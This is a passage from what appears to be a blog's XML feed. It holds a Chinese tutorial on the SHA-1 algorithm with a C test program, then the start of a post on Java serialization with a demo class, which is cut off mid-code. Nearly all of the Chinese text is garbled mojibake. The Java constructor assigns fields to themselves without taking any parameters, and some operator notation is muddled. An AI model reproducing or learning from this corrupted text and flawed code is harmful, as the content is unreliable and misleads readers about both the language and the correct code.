    <content type="html"><![CDATA[<h1 id="SHA-1ç®—æ³•"><a href="#SHA-1ç®—æ³•" class="headerlink" title="SHA-1ç®—æ³•"></a>SHA-1ç®—æ³•</h1><p><strong>SHA-1</strong>ï¼ˆè‹±è¯­ï¼šSecure Hash Algorithm 1ï¼Œä¸­æ–‡åï¼šå®‰å…¨æ•£åˆ—ç®—æ³•1ï¼‰æ˜¯ä¸€ç§å¯†ç æ•£åˆ—å‡½æ•°ã€‚SHA-1å¯ä»¥ç”Ÿæˆä¸€ä¸ªè¢«ç§°ä¸ºæ¶ˆæ¯ï¼ˆå°äº2^64ï¼‰æ‘˜è¦çš„160<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D">ä½</a>ï¼ˆ20<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">å­—èŠ‚</a>ï¼‰æ•£åˆ—å€¼ï¼Œæ•£åˆ—å€¼é€šå¸¸çš„å‘ˆç°å½¢å¼ä¸º40ä¸ª<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">åå…­è¿›åˆ¶</a>æ•°ã€‚</p><h2 id="å¯†ç æ•£åˆ—å‡½æ•°"><a href="#å¯†ç æ•£åˆ—å‡½æ•°" class="headerlink" title="å¯†ç æ•£åˆ—å‡½æ•°"></a>å¯†ç æ•£åˆ—å‡½æ•°</h2><p><strong>å¯†ç æ•£åˆ—å‡½æ•°</strong>ï¼ˆè‹±è¯­ï¼šCryptographic hash functionï¼‰ï¼Œåˆè¯‘ä¸º<strong>åŠ å¯†æ•£åˆ—å‡½æ•°</strong>ã€<strong>å¯†ç æ•£åˆ—å‡½æ•°</strong>ã€<strong>åŠ å¯†æ•£åˆ—å‡½æ•°</strong>ï¼Œæ˜¯<a href="https://zh.wikipedia.org/wiki/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B8">æ•£åˆ—å‡½æ•°</a>çš„ä¸€ç§ã€‚å®ƒè¢«è®¤ä¸ºæ˜¯ä¸€ç§<a href="https://zh.wikipedia.org/wiki/%E5%96%AE%E5%90%91%E5%87%BD%E6%95%B8">å•å‘å‡½æ•°</a>ï¼Œä¹Ÿå°±æ˜¯è¯´æå…¶éš¾ä»¥ç”±æ•£åˆ—å‡½æ•°è¾“å‡ºçš„ç»“æœï¼Œå›æ¨è¾“å…¥çš„èµ„æ–™æ˜¯ä»€ä¹ˆã€‚è¿™æ ·çš„å•å‘å‡½æ•°è¢«ç§°ä¸ºâ€œç°ä»£å¯†ç å­¦çš„é©®é©¬â€ã€‚</p><h2 id="SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤"><a href="#SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤" class="headerlink" title="SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤"></a>SHA-1ç®—æ³•å®ç°çš„å…·ä½“æ­¥éª¤</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272048527.jpg" alt="153211996026408701"></p><h3 id="æœ¯è¯­çš„æ¦‚å¿µ"><a href="#æœ¯è¯­çš„æ¦‚å¿µ" class="headerlink" title="æœ¯è¯­çš„æ¦‚å¿µ"></a>æœ¯è¯­çš„æ¦‚å¿µ</h3><h4 id="1ä½-Bit-ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰"><a href="#1ä½-Bit-ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰" class="headerlink" title="1ä½(Bit)ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰"></a>1ä½(Bit)ï¼Œå­—èŠ‚ï¼ˆByteï¼‰å’Œå­—ï¼ˆWordï¼‰</h4><p>SHA1å§‹ç»ˆæŠŠæ¶ˆæ¯å½“æˆä¸€ä¸ªä½ï¼ˆbitï¼‰å­—ç¬¦ä¸²æ¥å¤„ç†ã€‚æœ¬æ–‡ä¸­ï¼Œä¸€ä¸ªâ€œå­—â€ï¼ˆWordï¼‰æ˜¯32ä½ï¼Œè€Œä¸€ä¸ªâ€œå­—èŠ‚â€ï¼ˆByteï¼‰æ˜¯8ä½ã€‚æ¯”å¦‚ï¼Œå­—ç¬¦ä¸²â€œabcâ€å¯ä»¥è¢«è½¬æ¢æˆä¸€ä¸ªä½å­—ç¬¦ä¸²ï¼š<code>01100001 01100010 01100011</code>ã€‚å®ƒä¹Ÿå¯ä»¥è¢«è¡¨ç¤ºæˆ16è¿›åˆ¶å­—ç¬¦ä¸²: <code>0x616263</code>ã€‚</p><h4 id="è¿ç®—ç¬¦å’Œç¬¦å·"><a href="#è¿ç®—ç¬¦å’Œç¬¦å·" class="headerlink" title="è¿ç®—ç¬¦å’Œç¬¦å·"></a>è¿ç®—ç¬¦å’Œç¬¦å·</h4><p>ä¸‹é¢çš„é€»è¾‘è¿ç®—ç¬¦éƒ½è¢«è¿ç”¨äºâ€œå­—â€ï¼ˆWordï¼‰</p><p>X<code>^</code>ã€<code>&amp;</code>Y  &#x3D; Xï¼Œ Yé€»è¾‘ä¸</p><p>X <code>\/</code> Y  &#x3D; Xï¼Œ Yé€»è¾‘æˆ–</p><p>X <code>XOR</code> Y&#x3D; Xï¼Œ Yé€»è¾‘å¼‚æˆ–</p><p><code>~</code>X   &#x3D;  Xé€»è¾‘å–å</p><p>X<code>+</code>Yå®šä¹‰å¦‚ä¸‹ï¼š</p><p>å­— X å’Œ Y ä»£è¡¨ä¸¤ä¸ªæ•´æ•° x å’Œy, å…¶ä¸­ 0 &lt;&#x3D; x &lt; 2^32 ä¸” 0 &lt;&#x3D; y &lt; 2^32. ä»¤æ•´æ•°z &#x3D; (x + y) mod 2^32. è¿™æ—¶å€™ 0 &lt;&#x3D; z &lt; 2^32. å°†zè½¬æ¢æˆå­—Z, é‚£ä¹ˆå°±æ˜¯ Z &#x3D; X + Y.</p><p>å¾ªç¯å·¦ç§»ä½æ“ä½œç¬¦Sn(X)ã€‚Xæ˜¯ä¸€ä¸ªå­—ï¼Œnæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œ0&lt;&#x3D;n&lt;&#x3D;32ã€‚Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p><strong>X&lt;&lt;nå®šä¹‰å¦‚ä¸‹</strong>ï¼šæŠ›å¼ƒæœ€å·¦è¾¹çš„nä½æ•°å­—ï¼Œå°†å„ä¸ªä½ä¾æ¬¡å‘å·¦ç§»åŠ¨nä½ï¼Œç„¶åç”¨0å¡«è¡¥å³è¾¹çš„nä½ï¼ˆæœ€åç»“æœè¿˜æ˜¯32ä½ï¼‰ã€‚</p><p><strong>X&gt;&gt;nå®šä¹‰å¦‚ä¸‹</strong>ï¼šX&gt;&gt;næ˜¯æŠ›å¼ƒå³è¾¹çš„nä½ï¼Œå°†å„ä¸ªä½ä¾æ¬¡å‘å³ç§»åŠ¨nä½ï¼Œç„¶ååœ¨å·¦è¾¹çš„nä½å¡«0ã€‚å› æ­¤å¯ä»¥å«Sn(X)ä½å¾ªç¯ç§»ä½è¿ç®—</p><h3 id="å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²"><a href="#å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²" class="headerlink" title="å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²"></a>å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆä½å­—ç¬¦ä¸²</h3><p>å› ä¸ºåœ¨Sha-1ç®—æ³•ä¸­ï¼Œå®ƒçš„è¾“å…¥å¿…é¡»ä¸ºä½ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦å°†å…¶è½¬åŒ–ä¸ºä½å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬ä»¥â€œabcâ€å­—ç¬¦ä¸²æ¥è¯´æ˜é—®é¢˜ã€‚</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;a&#x27;=97       &#x27;b&#x27;=98       &#x27;c&#x27;=99<br>&#x27;a&#x27;=01100001 &#x27;b&#x27;=01100010 &#x27;c&#x27;=01100011<br></code></pre></td></tr></table></figure><h3 id="å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ"><a href="#å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ" class="headerlink" title="å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ"></a>å¯¹è½¬æ¢åçš„ä½å­—ç¬¦ä¸²è¿›è¡Œè¡¥ä½æ“ä½œ</h3><p>Sha-1ç®—æ³•æ ‡å‡†è§„å®šï¼Œå¿…é¡»å¯¹æ¶ˆæ¯æ‘˜è¦è¿›è¡Œè¡¥ä½æ“ä½œï¼Œå³å°†è¾“å…¥çš„æ•°æ®è¿›è¡Œå¡«å……ï¼Œä½¿å¾—æ•°æ®é•¿åº¦å¯¹512æ±‚ä½™çš„ç»“æœä¸º448ï¼Œå¡«å……æ¯”ç‰¹ä½çš„æœ€é«˜ä½è¡¥ä¸€ä¸ª1ï¼Œå…¶ä½™çš„ä½è¡¥0ï¼Œå¦‚æœåœ¨è¡¥ä½ä¹‹å‰å·²ç»æ»¡è¶³å¯¹512å–æ¨¡ä½™æ•°ä¸º448ï¼Œä¹Ÿè¦è¿›è¡Œè¡¥ä½ï¼Œåœ¨å…¶åè¡¥ä¸€ä½1å³å¯ã€‚æ€»ä¹‹ï¼Œè¡¥ä½æ˜¯è‡³å°‘è¡¥ä¸€ä½ï¼Œæœ€å¤šè¡¥512ä½ï¼Œæˆ‘ä»¬ä¾ç„¶ä»¥â€œabcâ€ä¸ºä¾‹ï¼Œå…¶è¡¥ä½è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>åˆå§‹çš„ä¿¡æ¯æ‘˜è¦ï¼š<code>01100001 01100010 01100011</code></p><p>ç¬¬ä¸€æ­¥è¡¥ä½ï¼š   <code>01100001 01100010 01100011 1</code></p><p>â€¦..        â€¦â€¦</p><p>è¡¥ä½æœ€åä¸€ä½ï¼š  <code>01100001 01100010 01100011 10.......0</code>(åé¢è¡¥äº†423ä¸ª0)</p><p>è€Œåæˆ‘ä»¬å°†è¡¥ä½æ“ä½œåçš„ä¿¡æ¯æ‘˜è¦è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><code>61626380 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000</code></p><p>(è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯61626380 ä»£è¡¨çš„åˆšå¥½æ˜¯4ä¸ª8ä½äºŒè¿›åˆ¶æ•°ï¼Œä¹Ÿå°±æ˜¯æŒ‡çš„æ˜¯<code>01100001 01100010 01100011 10000000</code>)</p><h3 id="é™„åŠ é•¿åº¦å€¼"><a href="#é™„åŠ é•¿åº¦å€¼" class="headerlink" title="é™„åŠ é•¿åº¦å€¼"></a>é™„åŠ é•¿åº¦å€¼</h3><p>åœ¨ä¿¡æ¯æ‘˜è¦åé¢é™„åŠ 64bitçš„ä¿¡æ¯ï¼Œç”¨æ¥è¡¨ç¤ºåŸå§‹ä¿¡æ¯æ‘˜è¦çš„é•¿åº¦ï¼Œåœ¨è¿™æ­¥æ“ä½œä¹‹åï¼Œä¿¡æ¯æŠ¥æ–‡ä¾¿æ˜¯512bitçš„å€æ•°ã€‚é€šå¸¸æ¥è¯´ç”¨ä¸€ä¸ª64ä½çš„æ•°æ®è¡¨ç¤ºåŸå§‹æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœæ¶ˆæ¯é•¿åº¦ä¸å¤§äº2^64ï¼Œé‚£ä¹ˆå‰32bitå°±ä¸º0ï¼Œåœ¨è¿›è¡Œé™„åŠ é•¿åº¦å€¼æ“ä½œåï¼Œå…¶â€œabcâ€æ•°æ®æŠ¥æ–‡å³å˜æˆå¦‚ä¸‹å½¢å¼ï¼š</p><p><code>61626380 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000018</code></p><p>å› ä¸ºâ€œabcâ€å 3ä¸ªå­—èŠ‚ï¼Œå³24ä½ ï¼Œæ¢ç®—ä¸ºåå…­è¿›åˆ¶å³ä¸º0x18ã€‚</p><h3 id="åˆå§‹åŒ–ç¼“å­˜"><a href="#åˆå§‹åŒ–ç¼“å­˜" class="headerlink" title="åˆå§‹åŒ–ç¼“å­˜"></a>åˆå§‹åŒ–ç¼“å­˜</h3><p>ä¸€ä¸ª160ä½MDç¼“å†²åŒºç”¨ä»¥ä¿å­˜ä¸­é—´å’Œæœ€ç»ˆæ•£åˆ—å‡½æ•°çš„ç»“æœã€‚å®ƒå¯ä»¥è¡¨ç¤ºä¸º5ä¸ª32ä½çš„å¯„å­˜å™¨(H0,H1,H2,H3,H4)ã€‚åˆå§‹åŒ–ä¸ºï¼š</p><p><code>H0 = 0x67452301</code></p><p><code>H1 = 0xEFCDAB89</code></p><p><code>H2 = 0x98BADCFE</code></p><p><code>H3 = 0x10325476</code></p><p><code>H4 = 0xC3D2E1F0</code></p><h3 id="è®¡ç®—æ¶ˆæ¯æ‘˜è¦"><a href="#è®¡ç®—æ¶ˆæ¯æ‘˜è¦" class="headerlink" title="è®¡ç®—æ¶ˆæ¯æ‘˜è¦"></a>è®¡ç®—æ¶ˆæ¯æ‘˜è¦</h3><p>åœ¨è®¡ç®—æŠ¥æ–‡ä¹‹å‰æˆ‘ä»¬è¿˜è¦åšä¸€äº›åŸºæœ¬çš„å·¥ä½œï¼Œå°±æ˜¯åœ¨æˆ‘ä»¬è®¡ç®—è¿‡ç¨‹ä¸­è¦ç”¨åˆ°çš„æ–¹æ³•ï¼Œæˆ–å®šä¹‰ã€‚</p><p>(1)ã€å¾ªç¯å·¦ç§»æ“ä½œç¬¦Sn(x),xæ˜¯ä¸€ä¸ªå­—ï¼Œä¹Ÿå°±æ˜¯32bitå¤§å°çš„å˜é‡ï¼Œnæ˜¯ä¸€ä¸ªæ•´æ•°ä¸”0&lt;&#x3D;n&lt;&#x3D;32ã€‚Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p>(2)ã€åœ¨ç¨‹åºä¸­æ‰€è¦ç”¨åˆ°çš„å¸¸é‡ï¼Œè¿™ä¸€ç³»åˆ—å¸¸é‡å­—k(0)ã€k(1)ã€â€¦k(79)ï¼Œå°†å…¶ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><p><code>Kt = 0x5A827999  (0 &lt;= t &lt;= 19)</code></p><p><code>Kt = 0x6ED9EBA1 (20 &lt;= t &lt;= 39)</code></p><p><code>Kt = 0x8F1BBCDC (40 &lt;= t &lt;= 59)</code></p><p><code>Kt = 0xCA62C1D6 (60 &lt;= t &lt;= 79)</code></p><p>(3)ã€æ‰€è¦ç”¨åˆ°çš„ä¸€ç³»åˆ—å‡½æ•°</p><p> <code>Ft(b,c,d)  ((b&amp;c)|((~b)&amp;d))   (0 &lt;= t &lt;= 19)</code></p><p> <code>Ft(b,c,d) (b^c^d)       (20 &lt;= t &lt;= 39)</code></p><p> <code>Ft(b,c,d) ((b&amp;c)|(b&amp;d)|(c&amp;d))  (40 &lt;= t &lt;= 59)</code></p><p> <code>Ft(b,c,d) (b^c^d)        (60 &lt;= t &lt;= 79)</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272045274.png"></p><h3 id="è®¡ç®—"><a href="#è®¡ç®—" class="headerlink" title="è®¡ç®—"></a>è®¡ç®—</h3><p>å¿…é¡»ä½¿ç”¨è¿›è¡Œäº†è¡¥ä½å’Œè¡¥é•¿åº¦åçš„æ¶ˆæ¯æ¥è®¡ç®—æ¶ˆæ¯æ‘˜è¦ã€‚</p><p>è®¡ç®—éœ€è¦ä¸€ä¸ªç¼“å†²åŒºï¼Œç”±5ä¸ª32ä½çš„å­—ç»„æˆï¼Œè¿˜éœ€è¦ä¸€ä¸ª80ä¸ª32ä½å­—çš„ç¼“å†²åŒºã€‚ç¬¬ä¸€ä¸ª5ä¸ªå­—çš„ç¼“å†²åŒºè¢«æ ‡è¯†ä¸ºAï¼ŒBï¼ŒCï¼ŒDï¼ŒEã€‚80ä¸ªå­—çš„ç¼“å†²åŒºè¢«æ ‡è¯†ä¸ºW0, W1,â€¦, W79</p><p>å¦å¤–è¿˜éœ€è¦ä¸€ä¸ªä¸€ä¸ªå­—çš„TEMPç¼“å†²åŒºã€‚</p><p>ä¸ºäº†äº§ç”Ÿæ¶ˆæ¯æ‘˜è¦ï¼Œåœ¨ç¬¬4éƒ¨åˆ†ä¸­å®šä¹‰çš„16ä¸ªå­—çš„æ•°æ®å—M1, M2,â€¦, Mn</p><p>ä¼šä¾æ¬¡è¿›è¡Œå¤„ç†ï¼Œå¤„ç†æ¯ä¸ªæ•°æ®å—Mi åŒ…å«80ä¸ªæ­¥éª¤ã€‚</p><p>ç°åœ¨å¼€å§‹å¤„ç†M1, M2, â€¦ , Mnã€‚ä¸ºäº†å¤„ç† Mi,éœ€è¦è¿›è¡Œä¸‹é¢çš„æ­¥éª¤</p><ul><li><p>(1). å°† Mi åˆ†æˆ 16 ä¸ªå­— W0, W1, â€¦ , W15,  W0 æ˜¯æœ€å·¦è¾¹çš„å­—<strong>ï¼ˆ512bitï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272046606.gif" alt="153211992014696001"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272047733.jpeg" alt="img"></p></li><li><p>(2). å¯¹äº t &#x3D; 16 åˆ° 79 ä»¤ Wt &#x3D; S1(Wt-3 XOR Wt-8 XOR Wt- 14 XOR Wt-16).</p></li><li><p>(3). ä»¤ A &#x3D; H0, B &#x3D; H1, C &#x3D; H2, D &#x3D; H3, E &#x3D; H4.</p></li><li><p>(4) å¯¹äº t &#x3D; 0 åˆ° 79ï¼Œæ‰§è¡Œä¸‹é¢çš„å¾ªç¯</p><p>â€‹    TEMP &#x3D; S5(A) + ft(B,C,D) + E + Wt + Kt;</p><p>â€‹    E &#x3D; D; D &#x3D; C; C &#x3D; S30(B); B &#x3D; A; A &#x3D; TEMP;</p></li><li><p>(5). ä»¤ H0 &#x3D; H0 + A, H1 &#x3D; H1 + B, H2 &#x3D; H2 + C, H3 &#x3D; H3 + D, H4 &#x3D; H4 + E</p><p>åœ¨å¤„ç†å®Œæ‰€æœ‰çš„ Mn, åï¼Œæ¶ˆæ¯æ‘˜è¦æ˜¯ä¸€ä¸ª160ä½çš„å­—ç¬¦ä¸²ï¼Œä»¥ä¸‹é¢çš„é¡ºåºæ ‡è¯†</p><p>H0 H1 H2 H3 H4ã€‚</p></li></ul><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SHA1Context sha;<br><span class="hljs-type">int</span> i, err;<br><span class="hljs-type">uint8_t</span> Message_Digest[<span class="hljs-number">20</span>];<br><span class="hljs-comment">// testing SHA1</span><br><span class="hljs-type">char</span>  *test = <span class="hljs-string">&quot;213124314124123asdasdas&quot;</span>;<br><span class="hljs-built_in">printf</span>( <span class="hljs-string">&quot;\næµ‹è¯•å€¼:\tâ€œ%sâ€\n&quot;</span>,test);<br>err = SHA1Reset(&amp;sha);    <span class="hljs-comment">//erro and return 0</span><br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1é‡ç½®é”™è¯¯ %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Input(&amp;sha, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)test, <span class="hljs-built_in">strlen</span>(test));<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1è¾“å…¥é”™è¯¯ %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Result(&amp;sha, Message_Digest);<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>    <span class="hljs-string">&quot;SHA1ç»“æœé”™è¯¯ %d, ä¸èƒ½è®¡ç®—æ‘˜è¦å€¼.\n&quot;</span>,<br>    err );<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‘˜è¦å€¼:\t&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span> ; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, Message_Digest[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>è¯¾å ‚çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¯†ç å­¦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–</title>
    <link href="/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaååºåˆ—åŒ–"><a href="#Javaååºåˆ—åŒ–" class="headerlink" title="Javaååºåˆ—åŒ–"></a>Javaååºåˆ—åŒ–</h1><h2 id="ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–"></a>ä¸ºä»€ä¹ˆè¦æœ‰ååºåˆ—åŒ–</h2><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹(ä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­)ï¼ŒObjectOutputStreamç±»çš„<span class="hljs-built_in">writeObject</span>()æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Javaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼ŒObjectInputStreamç±»çš„<span class="hljs-built_in">readObject</span>()æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚<br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–åçš„æ–‡ä»¶å¯ä»¥æ–¹ä¾¿åœ¨å„ä¸ªå¹³å°ä½¿ç”¨windowsã€linuxç­‰ã€‚</p><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><ul><li>1.è¯¥ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£ã€‚</li><li>2.è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚</li></ul><p><strong>æ³¨æ„ç‚¹ï¼šç”¨transientå…³é”®å­—ä¿®é¥°çš„å±æ€§é™¤å¤–ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹ã€‚</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 